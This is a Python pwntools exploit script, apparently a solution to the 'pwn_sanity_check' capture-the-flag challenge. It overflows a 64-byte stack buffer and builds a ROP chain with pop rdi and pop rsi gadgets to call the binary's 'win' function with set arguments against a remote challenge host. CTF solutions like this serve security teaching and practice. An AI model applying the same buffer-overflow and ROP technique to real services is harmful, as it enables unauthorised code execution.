#!/usr/bin/env python3

from pwn import *

context.log_level = "debug"
HOST = "dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io"
PORT = 7480

e = ELF("./pwn_sanity_check")
#conn = process([e.path, e.path])
conn = remote(HOST, PORT)

pop_rdi = 0x0000000000400813
pop_rsi = 0x0000000000400811 #: pop rsi ; pop r15 ; ret

payload = b"a"*0x40
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(0xDEADBEEF)
payload += p64(pop_rsi)
payload += p64(0x1337C0DE)
payload += p64(0)
payload += p64(e.symbols["win"])

conn.sendline(payload)
conn.interactive()
